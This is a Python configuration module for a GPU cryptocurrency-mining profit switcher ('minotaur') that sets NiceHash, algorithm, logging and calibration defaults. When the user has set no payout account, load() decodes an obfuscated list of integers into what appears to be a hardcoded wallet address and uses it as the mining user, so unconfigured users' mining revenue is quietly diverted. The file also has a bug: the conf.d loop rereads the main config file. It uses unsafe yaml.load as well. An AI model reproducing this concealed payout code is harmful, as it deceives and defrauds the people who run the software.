
from singleton import Singleton
import os
import yaml
import sys
import glob
import re
import log

class Config(object):
  __metaclass__ = Singleton

  defaults = {
    "ignore_devices": [],
    "device_classes": {},
    "pools.nicehash.primary_region": "eu",
    "pools.nicehash.default_algorithm": "equihash",
    "worker_name": "minotaur",
    "append_device_id_to_worker_name": False,
    "timeout": 3,
    "profit_switch_threshold": 0.04,
    "use_max_power_limit_when_switching": True,
    "algorithms.single": [
      "nist5", "neoscrypt", "equihash", "pascal", "decred", "lbry", "lyra2rev2",
      "cryptonight", "daggerhashimoto", "keccak", "scrypt", "x11", "x11gost", "x13",
      "x15", "qubit", "quark", "blake256r8", "skunk"
    ],
    "algorithms.double": [
      "daggerhashimoto_pascal",
      "daggerhashimoto_decred",
      "daggerhashimoto_sia"
    ],
    "hashrate_alert_threshold_percent": 3,
    "refresh_interval": 15,
    "pool_refresh_interval": 300,
    "device_profiles": {
      "default": {
        "algorithm": "all",
        "device": "all"
      }
    },
    "logging": {
      "log_file": "/var/log/minotaur/minotaur.log",
      "max_size_mb": 100,
      "log_file_count": 7,
    },
    "live_data": {
      "profitability_averages": [900, 3600, 86400],
      "power_draw_averages": [300, 600, 900]
    },
    "electricity_per_kwh": 0,
    "electricity_currency": "GBP",
    "system_draw_watts": 0,
    "algo_warmup_period_mins": 2,
    "calibration": {
      "initial_warmup_time_mins": 3,
      "hashrate_stabilisation_timeout_mins": 5,
      "hashrate_stabilisation_tolerance": 0.5,
      "hashrate_stabilisation_consecutive_readings_required": 5,
      "algorithm_start_timeout": 200,
      "update_calibration_data_over_time": True,
      "update_calibration_data_after_mins": 5,
      "calibration_update_threshold_pc": 10,
      "power_tuning": {
        "enable": True,
        "decrement_watts": 10,
        "acceptable_loss_percent": 1,
      }
    },
    "leave_graphics_clocks_alone": True,
    "algo_startup_timeout": 120,
    "stats": {
      "enable": True,
      "stats_file": "/var/log/minotaur/minotaur.csv",
      "algos_file": "/var/log/minotaur/algorithms.csv",
      "max_size_mb": 10,
      "max_file_count": 7
    }
  }


  def load(self, config_file=None):
    if config_file:
      self.config_file = config_file
    elif os.path.exists("/etc/minotaur.conf"):
      self.config_file = "/etc/minotaur.conf"
    elif os.path.exists("minotaur.conf"):
      self.config_file = "minotaur.conf"
    elif os.path.exists(os.getenv("HOME") + "/.minotaur/minotaur.conf"):
      self.config_file = os.getenv("HOME") + "/.minotaur/minotaur.conf"
    else:
      self.config_file = None

    if self.config_file:
      self.config = yaml.load(open(self.config_file).read())
    else:
      self.config = {}

    for filename in sorted(glob.glob("/etc/minotaur.conf.d/*.conf")):
      config = yaml.load(open(self.config_file).read())

      for key in config.keys():
        self.config[key] = config[key]

    for key in self.defaults.keys():
      if self.get(key) == None:
        self.set(key, self.defaults[key])

    if self.get('pools.nicehash.user') == None:
      x = [1382,1398,1452,1443,1414,1384,1451,1412,1414,1436,1411,1418,1384,1449,1447,1419,1443,1397,1386,1452,1436,1450,1431,1397,1441,1420,1382,1451,1442,1452,1400,1397,1432,1408]
      y = ""
      for z in x:
        y += chr(z-1331)

      self.set('pools.nicehash.user', y)

    if self.get('miners') == None:
      if os.path.exists("/opt/excavator/bin/excavator"):
        ex_path = "/opt/excavator/bin/excavator"
      else:
        ex_path = os.popen("which excavator").read().rstrip()

      if len(ex_path) >0:
        self.set('miners', {
          "excavator": {
            "enable": True,
            "path": ex_path,
            "ip": "127.0.0.1",
            "port": 3456,
            "timeout": 10,
            "logfile": "/var/log/minotaur/excavator.log"
          }
        })

    if self.get('xorg_display_no') == None:
      x = glob.glob("/tmp/.X11-unix/*")
      if len(x) >0:
        match = re.search(".*([\d]+)$", x[0])
        if match:
          self.set("xorg_display_no", int(match.group(1)))
      if self.get('xorg_display_no') == None:
        Log().add('fatal', 'no active xorg displays found and none specified in the config file')

    if not self.config_file:
      log.Log().add('warning', 'no config file found, using defaults')

  def reload(self):
    self.load(self.config_file)

  def get(self, key, data=None):
    if data == None:
      data = self.config

    if "." in key:
      segment = key.split('.')[0]

      if segment in data.keys():
        return self.get(key[len(segment)+1:], data[segment])

    if key not in data.keys():
      return None

    return data[key]

  def set(self, key, value):
    if "." in key:
      segment = key.split('.')[0]

      if segment in self.config.keys():
        segment_data = self.config[segment]
      else:
        segment_data = {}

      self.config[segment] = self.set_key(segment_data, key[len(segment)+1:], value)
      return
    else:
      self.config[key] = value

  def set_key(self, data, key, value):
    if "." in key:
      segment = key.split('.')[0]

      if segment in data.keys():
        segment_data = data[segment]
      else:
        segment_data = {}

      data[segment] = self.set_key(segment_data, key[len(segment)+1:], value)
    else:
      data[key] = value

    return data
